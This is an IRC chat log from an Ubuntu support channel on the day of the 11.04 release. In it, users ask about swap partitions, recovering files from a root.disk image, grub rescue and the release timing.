+[09:52] <guest345345> Rehan: 10GB is more than enough for an average ubuntu install but it may not give it enough room to allocate the recommended swap partition
+[09:52] <guest345345> Rehan: and that may be your problem
+[09:52] <Rehan> guest345345: i see, thank you
+[09:53] <mythri> I need help. Using Ubuntu 10.10. I have recovered my files through Windows and have only retrieved a single file Root.disk. Can anyone help?
+[09:53] <Rehan> guest345345: when you say "allocate the recommended swap partition" do you mean a third partition? I have a 500 GB drive and made a 490 GB NTFS win7 partition and a 10 GB ext4 ubuntu partition. Can the swap file be put on that same 10gb ext4 partition?
+[09:53] <walent> hello
+[09:54] <arnauddebordeaux> but there is no tuto for how to use this grub rescue, and I don't have any other solution...
+[09:54] <arnauddebordeaux> so
+[09:54] <arnauddebordeaux> my problem
+[09:54] <walent> what is name of ubuntu release party?
+[09:54] <nick-nack> 11.04 available for download yet?
+[09:54] <walent> channel
+[09:54] <guest345345> Rehan: yes...swap must be seperate......the installer allocates it automatically
+[09:54] <shomon> is there a curses alternative to diffusion? it just had my load average up really high... no idea what it was doing
+[09:54] <Incarus6> nick-nack, No
+[09:54] <mavis> haishi jiang zhongwen ba
+[09:54] <Marco1> how long till 11.04 realease?
+[09:54] <arnauddebordeaux> i have a computer whose CD reader doesn't work
+[09:54] <guest345345> Rehan: for a defualt full-disk install it will generally be 1:1 with your memory
+[09:54] <walent> is there ubuntu release pary?
+[09:54] <mythri> Is root.disk enough for recovering all my documents from ubuntu 10.10?
+[09:54] <Zavior> floodbot lol?
+[09:54] <guest345345> Rehan: but if you only give it 10GB disk to work with...maybe it will allocate less
+[09:54] <Incarus6> Marco1, It will be released in the next hours. There is no exact release time
+[09:55] <mythri> Is root.disk enough for recovering all my documents from ubuntu 10.10?
+[09:55] <guest345345> Rehan: I'm not sure exactly because I usually do custom and allocate swap myself
+[09:55] <Rehan> guest345345: will it create a new partition automatically? sorry i'm being unclear about it, trying to understand
+[09:55] <botcity> !party
+[09:55] <ubottu> Please remember that #ubuntu, #kubuntu, #xubuntu, and #edubuntu are support channels. To countdown to Natty release and then party once it happens, join #ubuntu-release-party - For in-person parties, see http://loco.ubuntu.com/events/global/744/detail/
+[09:55] <Rehan> guest345345: oh ok
+[09:55] <walent> join
+[09:55] <guest345345> Rehan: yes, any install will allocate swap by default
+[09:55] <mythri> Is root.disk enough for recovering all my documents from ubuntu 10.10?
+[09:55] <guest345345> Rehan: the simple/default install will hide it from you but it will do it nonetheless
+[09:55] <cfc_{Pawpad}> hello =3
+[09:56] <Rehan> guest345345: oh ok
+[09:56] <guest345345> Rehan: Windows and Mac to exactly the same too
+[09:56] <guest345345> do*
+[09:57] <Rehan> guest345345: oh ok. when i do fdisk -l i see an NTFS partition then an Extended and a third Linux one
+[09:57] <cfc_{Pawpad}> anyone know if theres gonna be a release of Ubuntu server 11.04 anytime soon?
+[09:57] <mythri> Is root.disk enough for recovering all my documents from ubuntu 10.10?
+[09:57] <guest345345> Rehan: actually...perhaps Windows 7 only uses a "pagefile" by default....but it's recommended to have a seperate parition for Win7 just the same
+[09:57] <Incarus6> cfc_{Pawpad}, it will be released today
+[09:58] <cfc_{Pawpad}> cool
+[09:58] <guest345345> Rehan: but Windows sucks of course....so I can understand why they don't follow best practices by default
+[09:58] <Incarus6> mythri, can you explain what you exactly did?
+[09:58] <cfc_{Pawpad}> cant wait =3
+[09:58] <Macer> and i just finished installing 10.10 server :) go figure
+[09:59] <cfc_{Pawpad}> Thanks
+[09:59] <Zavior> Macer: I'm in the same boat :)
+[09:59] <Macer> Zavior: upgrading the dist is easy enough
+=== MmikeMRMA is now known as Mmike
+[09:59] <Macer> personally i would rather wait a month or so before i instealled 11.04
+[09:59] <Zavior> I'm not to savy on linux :)
+[09:59] <mythri> Incarus6, I used disk internals and recovered my root.disk from ubuntu through Windows xp
+[09:59] <guest345345> Taking bets on release time.......my money is on 13:15 GMT
